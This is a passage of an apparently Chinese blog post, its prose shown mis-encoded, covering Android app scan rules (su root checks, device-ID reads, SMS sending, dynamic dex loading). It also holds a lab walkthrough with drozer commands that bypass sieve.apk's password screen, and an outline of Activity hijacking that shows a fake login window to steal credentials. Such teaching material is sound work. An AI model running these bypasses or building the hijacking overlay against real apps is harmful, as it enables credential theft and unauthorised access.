class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;ls -al&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><h3 id="Native-LibraryåŠ è½½æ£€æµ‹">Native LibraryåŠ è½½æ£€æµ‹</h3><p>æ£€æµ‹åŠ è½½soæ–‡ä»¶çš„Nativeæ–¹æ³•ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æç¤º</code></p><p>Javaä»£ç </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;libtest.so&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/lang/</span>System;-&gt;loadLibrary(Ljava<span class="regexp">/lang/</span>String;)V</span><br></pre></td></tr></table></figure><h3 id="å¤–éƒ¨åŠ¨æ€åŠ è½½dexæ£€æµ‹">å¤–éƒ¨åŠ¨æ€åŠ è½½dexæ£€æµ‹</h3><p>åœ¨Android4.1ä¹‹å‰çš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œå…è®¸åº”ç”¨åœ¨å…¨å±€å¯è¯»å¯å†™çš„ä½ç½®åŠ¨æ€åŠ è½½dexæ–‡ä»¶ï¼Œæœ‰æ–‡ä»¶è¢«æ›¿æ¢çš„é£é™©</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>éœ€è¦æ£€æµ‹ä»£ç ä¸­çš„DexClassLoaderå’ŒAndroidç‰ˆæœ¬ï¼Œåªæœ‰Androidç‰ˆæœ¬ &lt; 4.1æ‰ä¼šå‡ºç°è¯¥æ¼æ´ã€‚</p><p>Javaä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DexClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(</span><br><span class="line">    optimizedDexOutputPath.getAbsolutePath(),              <span class="comment">//å‚æ•°1</span></span><br><span class="line">    Environment.getExternalStorageDirectory().toString(),  <span class="comment">//å‚æ•°2</span></span><br><span class="line">    <span class="literal">null</span>,                                                  <span class="comment">//å‚æ•°3</span></span><br><span class="line">    getClassLoader());                                     <span class="comment">//å‚æ•°4</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Ldalvik<span class="symbol">/system/DexClassLoader</span>;<span class="operator">-&gt;</span><span class="symbol">&lt;init&gt;</span>(Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/String</span>;</span><br><span class="line"></span><br><span class="line">Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/ClassLoader</span>;)V</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>å»ºè®®</strong></p><ul><li>ç¦æ­¢å¤–éƒ¨ï¼ˆä¸å®‰å…¨çš„æºï¼‰åŠ è½½DEXï¼Œå°†æ‰€éœ€è¦åŠ¨æ€åŠ è½½çš„DEX/APKæ–‡ä»¶æ”¾ç½®åˆ°APKå†…éƒ¨æˆ–åº”ç”¨ç§æœ‰ç›®å½•ä¸­ã€‚</li><li>ä½¿ç”¨åŠ å¯†ç½‘ç»œåè®®è¿›è¡Œä¸‹è½½åŠ è½½çš„DEX/APKæ–‡ä»¶å¹¶å°†å…¶æ”¾ç½®åˆ°åº”ç”¨ç§æœ‰ç›®å½•ä¸­ã€‚</li><li>å¯¹ä¸å¯ä¿¡çš„åŠ è½½æ¥æºè¿›è¡Œå®Œæ•´æ€§æ ¡éªŒã€‚</li></ul><h3 id="rootä»£ç æ£€æµ‹">rootä»£ç æ£€æµ‹</h3><p>æ£€æŸ¥appæ˜¯å¦æœ‰æ‰§è¡Œæ£€æµ‹rootç¯å¢ƒçš„ä»£ç ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>Javaä»£ç </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;su&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;su&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><h3 id="è·å–IMEI-å’ŒDevice-IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹">è·å–IMEI å’ŒDevice IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹</h3><p>æ£€æŸ¥appæ˜¯å¦æœ‰æ‰§è¡Œè·å–IMEIå’ŒDevice IDæ•æ„Ÿä¿¡æ¯çš„ä»£ç ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>Javaä»£ç </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TelephonyManager tm <span class="operator">=</span> (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String DEVICE_ID <span class="operator">=</span> tm.getDeviceId()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;tm&quot;</span>:<span class="class">Landroid/telephony/TelephonyManager;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Landroid/telephony/TelephonyManager;</span>-&gt;getDeviceId()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.local</span> v0, <span class="string">&quot;DEVICE_ID&quot;</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">return-void</span><br></pre></td></tr></table></figure><h3 id="è·å–Android-IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹">è·å–Android IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹</h3><p>æ£€æŸ¥appæ˜¯å¦æœ‰æ‰§è¡Œè·å–Android IDæ•æ„Ÿä¿¡æ¯çš„ä»£ç ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>Javaä»£ç </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.provider.Settings.Secure;</span><br><span class="line"><span class="type">String</span> androidId = Secure.<span class="built_in">getString</span>(<span class="built_in">getContentResolver</span>(), Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">Lcom/bug/sensitive/func/MainActivity;</span>-&gt;getContentResolver()<span class="class">Landroid/content/ContentResolver;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v1, <span class="string">&quot;android_id&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/provider/Settings$Secure;</span></span><br><span class="line">-&gt;getString(<span class="class">Landroid/content/ContentResolver;</span><span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br></pre></td></tr></table></figure><h3 id="å‘é€SMSæ•æ„Ÿä»£ç æ£€æµ‹">å‘é€SMSæ•æ„Ÿä»£ç æ£€æµ‹</h3><p>æ£€æŸ¥appæ˜¯å¦æœ‰è°ƒç”¨å‘é€SMSå‡½æ•°ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>Javaä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SmsManager</span> <span class="variable">smsm</span> <span class="operator">=</span> SmsManager.getDefault();</span><br><span class="line">smsm.sendTextMessage(<span class="string">&quot;123123&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendDataMessage(<span class="string">&quot;13123&quot;</span>, <span class="string">&quot;123&quot;</span>, (<span class="type">short</span>) <span class="number">90</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendMultimediaMessage(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶åˆ é™¤ä»£ç æ£€æµ‹">æ–‡ä»¶åˆ é™¤ä»£ç æ£€æµ‹</h3><p>æ£€æµ‹appæ˜¯å¦æœ‰è°ƒç”¨åˆ é™¤æ–‡ä»¶çš„ä»£ç </p><p>**é£é™©ç­‰çº§ï¼š**æé†’</p><p><strong>é—®é¢˜ç¤ºä¾‹</strong></p><p>Javaä»£ç </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;tmp.doc&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> deleted = <span class="keyword">file</span>.<span class="keyword">delete</span>();</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç åç¼–è¯‘åçš„Dalvik/ARTä»£ç ä¸º</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v2, <span class="string">&quot;tmp.doc&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/io/File;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 55</span><br><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;file&quot;</span>:<span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/io/File;</span>-&gt;delete()Z</span><br></pre></td></tr></table></figure><h3 id="signatureä»£ç æ£€æµ‹">signatureä»£ç æ£€æµ‹</h3><p>æ£€æŸ¥appæ˜¯å¦æœ‰è°ƒç”¨è·å–signatureçš„ä»£ç ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>æé†’</code></p><p><strong>é—®é¢˜ç¤ºä¾‹</strong>ï¼š</p><p>Javaä»£ç </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PackageManager pkgManager = <span class="built_in">context</span>.getPackageManager();</span><br><span class="line"><span class="keyword">byte[] </span>signature = pkgManager.getPackageInfo(</span><br><span class="line">    <span class="built_in">context</span>.getPackageName(),</span><br><span class="line">    PackageManager.GET_SIGNATURES).signatures[<span class="number">0</span>].toByteArray(); </span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç åç¼–è¯‘åçš„Dalvik/ARTä»£ç </p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move-result-object v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">iget-object </span>v2, v0, <span class="class">Landroid/content/pm/PackageInfo;</span>-&gt;signatures:[<span class="class">Landroid/content/pm/Signature;</span></span><br></pre></td></tr></table></figure><h2 id="ç³»ç»Ÿæ¼æ´æ£€æµ‹">ç³»ç»Ÿæ¼æ´æ£€æµ‹</h2><h1>APPä¸€äº›æ¼æ´åŸç†</h1><h2 id="Activityç»„ä»¶çš„ç›¸å…³æ¼æ´">Activityç»„ä»¶çš„ç›¸å…³æ¼æ´</h2><p><strong>(1) Activityæ¼æ´ç§ç±»</strong></p><ul><li>è¶Šæƒç»•è¿‡</li><li>é’“é±¼æ¬ºè¯ˆ/ActivityåŠ«æŒ</li><li>éšç§å¯åŠ¨intentåŒ…å«æ•æ„Ÿä¿¡æ¯</li><li>æ‹’ç»æœåŠ¡æ”»å‡»</li></ul><p><strong>(2) Activityå®‰å…¨åœºæ™¯å’Œå±å®³</strong></p><p>Activityçš„ç»„ä»¶å¯¼å‡ºï¼Œä¸€èˆ¬ä¼šå¯¼è‡´çš„é—®é¢˜Android Browser Intent Scheme URLsçš„æ”»å‡»æ‰‹æ®µ</p><ul><li>æ‹’ç»æœåŠ¡æ”»å‡»ï¼šé€šè¿‡Intentç»™Activityä¼ è¾“ç•¸å½¢æ•°æ®ä½¿å¾—ç¨‹åºå´©æºƒä»è€Œå½±å“ç”¨æˆ·ä½“éªŒ</li><li>è¶Šæƒæ”»å‡»ï¼šActivityç”¨æˆ·ç•Œé¢ç»•è¿‡ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯çªƒå–ï¼ŒActivityç•Œé¢è¢«åŠ«æŒäº§ç”Ÿæ¬ºè¯ˆç­‰å®‰å…¨äº‹ä»¶</li><li>ç»„ä»¶å¯¼å‡ºå¯¼è‡´é’“é±¼æ¬ºè¯ˆ</li><li>éšå¼å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®</li></ul><h3 id="Activityæ¼æ´åŸç†åˆ†æå’Œå¤ç°">Activityæ¼æ´åŸç†åˆ†æå’Œå¤ç°</h3><h4 id="è¶Šæƒç»•è¿‡"><strong>è¶Šæƒç»•è¿‡</strong></h4><p><strong>åŸç†åˆ†æ</strong>ï¼š</p><p>åœ¨Androidç³»ç»Ÿä¸­ï¼ŒActivityé»˜è®¤æ˜¯ä¸å¯¼å‡ºçš„ï¼Œå¦‚æœè®¾ç½®äº†exported <code>=` `&quot;true&quot;` `è¿™æ ·çš„å…³é”®å€¼æˆ–è€…æ˜¯æ·»åŠ äº†&lt;intent</code>-<code>filter</code>&gt;è¿™æ ·çš„å±æ€§ï¼Œé‚£ä¹ˆæ­¤æ—¶Activityæ˜¯å¯¼å‡ºçš„ï¼Œå°±ä¼šå¯¼è‡´è¶Šæƒç»•è¿‡æˆ–è€…æ˜¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰å®‰å…¨é£é™©ã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p>é™„ä»¶ï¼šsieve.apk</p><p>ä½¿ç”¨drozerè¿›è¡Œåˆ†æ</p><p>æ‰“å¼€è¿™ä¸ªdemoï¼Œå‘ç°éœ€è¦è¾“å…¥è´¦å·å’Œå¯†ç æ‰èƒ½è¿›å…¥ä¸‹ä¸€ä¸ªActivityï¼Œæˆ‘ä»¬æ‰æ˜¯è¶Šæƒç»•è¿‡è¿™ä¸ª<code>å¯†ç éªŒè¯</code>ç•Œé¢ã€‚</p><ul><li><p>æŸ¥æ‰¾è¯¥appåŒ…å <code>run app.package.list</code></p></li><li><p>æŸ¥è¯¢ç›®æ ‡åº”ç”¨çš„æ”»å‡»é¢ï¼ŒçŸ¥é“æœ‰ä¸‰ä¸ªActivityæ˜¯è¢«å¯¼å‡ºçš„<br><code>run app.package.attacksurface com.mwr.example.sieve</code><img src="/posts/f416437f.htm/image-20240921212645899.png" alt="image-20240921212645899"></p></li><li><p>ç»§ç»­æŸ¥è¯¢æš´éœ²çš„Activityä¿¡æ¯<br><code>run app.activity.info -a com.mwr.example.sieve</code><img src="/posts/f416437f.htm/image-20240921212828487.png" alt="image-20240921212828487"></p></li><li><p>è¯´æ˜å¯ä»¥è¿›è¡ŒActivityç›¸äº’è¶Šæƒ</p><p><code>run app.activity.start --component  com.mwr.example.sieve com.mwr.example.sieve.PWList</code></p></li></ul><p><strong>é˜²æŠ¤ç­–ç•¥</strong></p><ul><li>ç§æœ‰Activityä¸åº”è¯¥è¢«å…¶ä»–åº”ç”¨å¯åŠ¨ç›¸å¯¹æ˜¯å®‰å…¨çš„ï¼Œåˆ›å»ºActivityæ—¶ï¼Œè®¾ç½®exportedå±æ€§ä¸ºfalse</li><li>å…¬å¼€æš´éœ²çš„Activityç»„ä»¶ï¼Œå¯ä»¥è¢«ä»»æ„åº”ç”¨å¯åŠ¨ï¼Œåˆ›å»ºActivityï¼šè®¾ç½®exportå±æ€§ä¸ºtrueï¼Œè°¨æ…å¤„ç†æ¥æ”¶çš„Intentï¼Œæœ‰è¿”å›æ•°æ®ä¸åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œä¸åº”å‘é€æ•æ„Ÿä¿¡æ¯ï¼Œæ”¶åˆ°è¿”å›æ•°æ®è°¨æ…å¤„ç†</li></ul><h4 id="é’“é±¼æ¬ºè¯ˆ-ActivityåŠ«æŒ">é’“é±¼æ¬ºè¯ˆ/ActivityåŠ«æŒ</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>â€‹         Activity appä¸­ä¸åŒç•Œé¢çš„åˆ‡æ¢é€šè¿‡activityçš„è°ƒåº¦æ¥å®ç°ï¼Œè€Œactivityçš„è°ƒåº¦æ˜¯ç”±Activityç³»ç»Ÿä¸­çš„AMSæ¥å®ç°çš„ã€‚æ¯ä¸ªåº”ç”¨æƒ³è¦å¯åŠ¨æˆ–è€…åœæ­¢ä¸€ä¸ªè¿›ç¨‹ï¼Œéƒ½æŠ¥å‘Šç»™AMSã€‚AMSæ”¶åˆ°å¯åŠ¨æˆ–åœæ­¢Activityçš„æ¶ˆæ¯æ—¶ï¼Œå…ˆæ›´æ–°å†…éƒ¨è®°å½•ï¼Œå†é€šçŸ¥ç›¸åº”çš„è¿›ç¨‹æˆ–åœæ­¢æŒ‡å®šçš„Activityã€‚å½“æ–°çš„Activityå¯åŠ¨ï¼Œå‰ä¸€ä¸ªActivityå°±ä¼šåœæ­¢ï¼Œè¿™äº›Activityä¼šä¿ç•™åœ¨ç³»ç»Ÿä¸­çš„ä¸€ä¸ªActivityå†å²æ ˆä¸­ã€‚æ¯æœ‰ä¸€ä¸ªActivityå¯åŠ¨ï¼Œå®ƒå°±å‹å…¥å†å²æ ˆé¡¶ï¼Œå¹¶åœ¨æ‰‹æœºä¸Šæ˜¾ç¤ºã€‚å½“ç”¨æˆ·æŒ‰ä¸‹backï¼Œé¡¶éƒ¨çš„Activityå¼¹å‡ºï¼Œæ¢å¤å‰ä¸€ä¸ªActivityï¼Œæ ˆé¡¶æŒ‡å‘å½“å‰çš„Activityã€‚</p><p>â€‹        ç”±äºActivityçš„è¿™ç§ç‰¹æ€§ï¼Œå¦‚æœåœ¨å¯åŠ¨ä¸€ä¸ªactivityæ—¶ï¼Œç»™ä»–åŠ å…¥ä¸€ä¸ªæ ‡ç­¾FLAG_ACTIVITY_NEW_TASKï¼Œå°±ä¼šä½¿ä»–ç½®äºæ ˆé¡¶è®©ä»–ç«‹é©¬å‘ˆç°ç»™ç”¨æˆ·ï¼Œå¦‚æœè¿™ä¸ªActivityæ˜¯ç”¨äºç›—å·çš„ä¼ªè£…Activityï¼Œå°±ä¼šäº§ç”Ÿé’“é±¼å®‰å…¨äº‹ä»¶æˆ–è€…ä¸€ä¸ªActivityä¸­æœ‰webviewåŠ è½½ï¼Œå…è®¸åŠ è½½ä»»æ„ç½‘é¡µéƒ½æœ‰å¯èƒ½äº§ç”Ÿé’“é±¼äº‹ä»¶ã€‚</p><p><strong>å®ç°åŸç†ï¼š</strong><br>å¦‚æœæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªreceiverï¼Œå“åº”android.intent.action.BOOT_COMPLETEDï¼Œä½¿å¾—å¼€å¯å¯åŠ¨ä¸€ä¸ªserviceï¼›è¿™ä¸ªserviceï¼Œä¼šå¯åŠ¨ä¸€ä¸ªè®¡æ—¶å™¨ï¼Œä¸åœæšä¸¾å½“å‰è¿›ç¨‹ä¸­æ˜¯å¦æœ‰é¢„è®¾çš„è¿›ç¨‹å¯åŠ¨ï¼Œå¦‚æœå‘ç°æœ‰é¢„è®¾è¿›ç¨‹ï¼Œåˆ™ä½¿ç”¨FLAG_ACTIVITY_NEW_TASKå¯åŠ¨è‡ªå·±çš„é’“é±¼ç•Œé¢ï¼Œæˆªè·æ­£å¸¸åº”ç”¨çš„ç™»å½•å‡­è¯</p><p><strong>å®ç°æ­¥éª¤ï¼š</strong><br>(<code>1</code>)å¯åŠ¨ä¸€ä¸ªæœåŠ¡<br>(<code>2</code>)ä¸æ–­æ‰«æå½“å‰è¿›ç¨‹<br>(<code>3</code>)æ‰¾åˆ°ç›®æ ‡åå¼¹å‡ºä¼ªè£…çª—å£</p><p><strong>å®‰å…¨é˜²æŠ¤</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœçœŸçš„çˆ†å‘äº†è¿™ç§æ¶æ„ç¨‹åºï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½åœ¨å¯åŠ¨ç¨‹åºæ—¶æ¯ä¸€æ¬¡éƒ½é‚£ä¹ˆå°å¿ƒå»æŸ¥çœ‹åˆ¤æ–­å½“å‰åœ¨è¿è¡Œçš„æ˜¯å“ªä¸€ä¸ªç¨‹åºï¼Œå½“android:noHistory<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;true&quot;</span><span class="string">``</span>æ—¶ä¸Šé¢çš„æ–¹æ³•ä¹Ÿæ— æ•ˆ</span><br><span class="line">ç›®å‰ï¼Œå¯¹activityåŠ«æŒçš„é˜²æŠ¤ï¼Œåªèƒ½æ˜¯é€‚å½“ç»™ç”¨æˆ·è­¦ç¤ºä¿¡æ¯ã€‚ä¸€äº›ç®€å•çš„é˜²æŠ¤æ‰‹æ®µå°±æ˜¯æ˜¾ç¤ºå½“å‰è¿è¡Œçš„è¿›ç¨‹æç¤ºæ¡†ã€‚</span><br><span class="line">æ¢†æ¢†åŠ å›ºåˆ™æ˜¯åœ¨è¿›ç¨‹åˆ‡æ¢çš„æ—¶å€™ç»™å‡ºæç¤ºï¼Œå¹¶ä½¿ç”¨ç™½åå•è¿‡æ»¤ã€‚</span><br></pre></td></tr></table></figure><h4 id="éšç§å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®">éšç§å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>ä»‹ç»åŸç†ä¹‹å‰å…ˆç†Ÿæ‚‰ä¸€ä¸‹Intentçš„éšå¼å’Œæ˜¾å¼ä¸¤ç§</p><ul><li><p>æ˜¾å¼æ–¹æ³•<br><code>Intent intent = new Intent(MainActivit.this, NewActivity.class)</code></p></li><li><p>éšå¼æ–¹æ³•</p><p>ä¸€èˆ¬ç”¨äºä¸åŒåº”ç”¨ç¨‹åºä¹‹é—´çš„æ•°æ®ä¼ é€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.wooyun.test&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure></li></ul><p>åŸç†ä»‹ç»ï¼šæœ‰ä¸€ä¸ªåº”ç”¨Aï¼Œé‡‡ç”¨Intentéšå¼ä¼ é€’ï¼Œä»–çš„åŠ¨ä½œæ˜¯&quot;x&quot;ï¼Œæ­¤æ—¶è¿˜æœ‰ä¸€ä¸ªåº”ç”¨Bï¼ŒåŠ¨ä½œä¹Ÿæ˜¯Xï¼Œæˆ‘ä»¬åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œé€šè¿‡éšå¼Intentä¼ é€’ï¼Œå°±ä¼šå‡ºç°ä¸¤ä¸ªç•Œé¢ï¼Œæˆ‘ä»¬ä¸çŸ¥é“åˆ°åº•å¯åŠ¨Aè¿˜æ˜¯B</p><p>å› ä¸ºç°åœ¨è¿™ç§æ¼æ´åœ¨Androidç‰ˆæœ¬æ›´æ–°åï¼ŒåŸºæœ¬å¾ˆå°‘å‡ºç°äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸åšå¤ç°å’Œå®‰å…¨é˜²æŠ¤äº†</p><h4 id="æ‹’ç»æœåŠ¡æ”»å‡»">æ‹’ç»æœåŠ¡æ”»å‡»</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>â€‹        æ‹’ç»æœåŠ¡æ”»å‡»æºäºç¨‹åºæ²¡æœ‰å¯¹Intent.getXXXExtra()è·å–çš„å¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®å¤„ç†æ—¶æ²¡æœ‰è¿›è¡Œå¼‚å¸¸æ•è·ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å‘åº”ç”¨ç¨‹åºå‘é€æ­¤ç±»ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®æ¥è¾¾åˆ°ä½¿è¯¥åº”ç”¨crashçš„ç›®çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡intentå‘é€ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®ç»™æ­£å¸¸åº”ç”¨ï¼Œå¯¼è‡´å…¶å´©æºƒã€‚æœ¬åœ°æ‹’ç»æœåŠ¡å¯ä»¥è¢«ç«äº‰æ–¹åˆ©ç”¨æ”»å‡»ï¼Œä½¿å¾—è‡ªå·±çš„åº”ç”¨å´©æºƒé€ æˆç ´åã€‚</p><p>â€‹        å±å®³ï¼šæ‹’ç»æœåŠ¡æ¼æ´å¯¹äºé”å±åº”ç”¨ã€å®‰å…¨é˜²æŠ¤ç±»è½¯ä»¶å±å®³æ˜¯å·¨å¤§çš„</p><p><strong>å®‰å…¨é˜²æŠ¤</strong></p><h5 id="Androidå¤–éƒ¨ç¨‹åºçš„è°ƒç”¨æ–¹æ³•">Androidå¤–éƒ¨ç¨‹åºçš„è°ƒç”¨æ–¹æ³•</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 